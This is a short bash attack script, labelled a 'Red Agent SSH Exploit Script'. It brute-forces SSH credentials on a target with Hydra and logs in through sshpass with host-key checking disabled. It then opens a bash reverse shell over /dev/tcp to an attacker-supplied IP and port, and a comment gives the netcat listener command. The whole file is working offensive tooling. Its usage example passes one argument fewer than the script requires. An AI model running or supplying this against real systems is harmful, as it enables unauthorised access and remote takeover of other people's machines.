#!/bin/bash

# Red Agent SSH Exploit Script
# 1. Brute-force SSH using Hydra
# 2. If successful, drop a reverse shell to attacker

if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <target-ip> <userlist> <passlist> <attacker-ip> <attacker-port>"
    echo "Example: $0 10.0.0.2 users.txt passwords.txt 10.0.0.1"
    exit 1
fi

TARGET_IP=$1
USERLIST=$2
PASSLIST=$3
ATTACKER_IP=$4
PORT=22
REVSHELL_PORT=$5

echo "[*] Starting brute-force on $TARGET_IP..."

# Run hydra to find valid credentials
hydra -L "$USERLIST" -P "$PASSLIST" ssh://$TARGET_IP -t 4 -o found_creds.txt -f

if [ ! -s found_creds.txt ]; then
    echo "[-] No valid credentials found."
    exit 1
fi

CREDENTIAL_LINE=$(grep -i "login:" found_creds.txt | head -n1)
USERNAME=$(echo "$CREDENTIAL_LINE" | awk '{print $5}')
PASSWORD=$(echo "$CREDENTIAL_LINE" | awk '{print $7}')

echo "[+] Found valid credentials: $USERNAME:$PASSWORD"

echo "[*] Attempting reverse shell to $ATTACKER_IP:$REVSHELL_PORT"

# On attacker, start listener:
# nc -lvnp 4444

sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USERNAME@$TARGET_IP" "bash -i >& /dev/tcp/$ATTACKER_IP/$REVSHELL_PORT 0>&1" &

echo "[+] Reverse shell attempt sent. Check your listener."
